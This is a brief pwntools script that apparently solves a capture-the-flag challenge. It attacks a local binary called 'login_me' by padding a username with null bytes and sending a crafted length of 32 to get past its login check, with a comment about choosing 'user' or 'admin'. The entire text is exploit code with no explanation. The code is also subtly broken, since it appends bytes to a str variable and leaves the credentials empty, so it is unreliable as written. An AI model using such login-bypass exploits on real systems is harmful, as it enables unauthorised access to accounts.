from pwn import *
username = '' #根据user和admin来选择
passwd = ''
p = process('./login_me')
p.recv()
username +=b"\x00"*28
p.send(username)
p.recv()
p.sendline(b"32")
p.recv()
p.send(passwd)
p.recv()
